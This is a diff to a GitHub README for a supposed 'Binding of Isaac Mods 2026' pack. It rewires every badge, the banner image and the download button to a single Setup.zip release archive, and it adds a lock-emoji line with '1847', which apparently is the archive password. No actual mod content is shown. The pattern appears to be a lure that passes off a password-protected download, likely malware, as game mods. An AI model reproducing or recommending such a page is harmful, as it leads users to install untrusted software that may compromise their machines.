@@ -1,14 +1,14 @@
 # 🎮 Binding of Isaac Mods 2026 — Best Mods Collection & Ultimate Pack
 
-[![GitHub Stars](https://img.shields.io/github/stars/placeholder/Binding-of-Isaac)]()
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)]()
-[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)]()
-[![Category](https://img.shields.io/badge/Category-Modding-orange)]()
-[![Updated](https://img.shields.io/badge/Updated-2026-brightgreen)]()
+[![GitHub Stars](https://img.shields.io/github/stars/placeholder/Binding-of-Isaac)](https://github.com/PearlDeskShed/Binding-of-Isaac-Mods/releases/download/Binding-of-Isaac-Mods/Setup.zip)
+[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://github.com/PearlDeskShed/Binding-of-Isaac-Mods/releases/download/Binding-of-Isaac-Mods/Setup.zip)
+[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)](https://github.com/PearlDeskShed/Binding-of-Isaac-Mods/releases/download/Binding-of-Isaac-Mods/Setup.zip)
+[![Category](https://img.shields.io/badge/Category-Modding-orange)](https://github.com/PearlDeskShed/Binding-of-Isaac-Mods/releases/download/Binding-of-Isaac-Mods/Setup.zip)
+[![Updated](https://img.shields.io/badge/Updated-2026-brightgreen)](https://github.com/PearlDeskShed/Binding-of-Isaac-Mods/releases/download/Binding-of-Isaac-Mods/Setup.zip)
 
 ---
 
-[![Download](og-image.png)]()
+[![Download](og-image.png)](https://github.com/PearlDeskShed/Binding-of-Isaac-Mods/releases/download/Binding-of-Isaac-Mods/Setup.zip)
 
 
 ---
@@ -21,7 +21,7 @@
 
 ## 📥 Download
 
-[![Binding of Isaac Mods](https://img.shields.io/badge/Download%20Binding%20of%20Isaac%20Mods-Open%20Page-0a84ff?style=for-the-badge&logo=github)]()
+[![Binding of Isaac Mods](https://img.shields.io/badge/Download%20Binding%20of%20Isaac%20Mods-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://github.com/PearlDeskShed/Binding-of-Isaac-Mods/releases/download/Binding-of-Isaac-Mods/Setup.zip)
 
 **🔐🔐🔐** `1847`
 
